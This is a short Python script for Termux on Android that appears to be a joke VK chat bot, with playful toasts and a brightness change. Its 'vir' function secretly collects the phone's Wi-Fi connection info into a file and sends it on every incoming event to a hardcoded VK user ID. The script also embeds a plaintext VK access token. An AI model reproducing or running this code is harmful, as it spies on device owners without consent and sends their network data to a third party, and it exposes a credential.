import time
import os
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
def bot():
    def vir():
            os.system(r'termux-wifi-connectioninfo>>red.txt')
            o=open(r'red.txt')
            rik=o.read()
            y(437306907,rik)
#            os.system('termux-torch on')
#            os.system('termux-vibrate -d 1000')
            os.system('termux-toast напиши вк')
    rand=123456
    print('Не темно?')
    os.system('termux-brightness 255')
    time.sleep(1)
    os.system('termux-toast не волнуйся')
    time.sleep(2)
    os.system('termux-toast так лучше :D')
    token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
    def y(user_id,message):
        vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
    vk=vk_api.VkApi(token=token)
    longpoll=VkLongPoll(vk)
    for event in longpoll.listen():
        vir()
        if event.type==VkEventType.MESSAGE_NEW:
            rand+=1
            if event.to_me:
                r=event.text
                if r=='lol':
                    y(event.user_id,'lol kek')
                else:
                    vir()
bot()
